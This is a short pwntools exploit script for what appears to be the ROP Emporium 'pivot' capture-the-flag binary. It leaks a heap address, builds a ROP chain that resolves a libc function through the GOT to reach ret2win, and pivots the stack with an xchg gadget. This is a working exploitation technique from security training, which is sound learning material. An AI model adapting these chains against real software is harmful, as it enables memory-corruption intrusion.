from pwn import *

elf = ELF('./pivot')
libc = ELF('./libpivot.so', checksec=False)
io = elf.process()

pause()

io.recvuntil(b"pivot: ")
leak = int(io.recvline(), 16)
log.success(f"leak is: {hex(leak)}")

io.recvuntil(b"> ")

heap = b""
#heap += p64(leak)
heap += p64(elf.plt['foothold_function'])
heap += p64(0x00000000004009bb) # : pop rax ; ret
heap += p64(elf.got['foothold_function'])
heap += p64(0x00000000004009c0) # : mov rax, qword ptr [rax] ; ret
heap += p64(0x00000000004007c8) # : pop rbp ; ret
heap += p64(libc.sym['ret2win'] - libc.sym['foothold_function'])
heap += p64(0x00000000004009c4) # : add rax, rbp ; ret
heap += p64(0x00000000004007c1) # : jmp rax | call rax both get the job done

io.sendline(heap)

#----------------------------------------------------------------

io.recvuntil(b"> ")
stack = b"A" * 40
stack += p64(0x00000000004009bb) # : pop rax ; ret
stack += p64(leak)
stack += p64(0x00000000004009bd) # : xchg rsp, rax ; ret


io.sendline(stack)

io.interactive()
